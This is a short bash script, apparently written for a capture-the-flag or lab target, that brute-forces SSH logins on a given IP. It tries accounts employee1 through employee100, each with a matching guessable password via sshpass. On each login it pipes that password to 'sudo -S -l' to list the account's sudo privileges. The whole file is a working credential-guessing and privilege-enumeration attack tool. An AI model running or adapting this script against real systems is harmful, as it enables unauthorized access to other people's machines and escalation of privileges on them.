#!/bin/bash
# author : m3rc 

IP=$1
sleep 2
for i in {1..100}
do
    echo -e '\e[33mTry: \e[0m' $i
    echo ""
    sshpass -p 'employee'$i ssh employee$i@$IP 'echo employee'$i' | sudo -S -l'
    printf "\n"
done
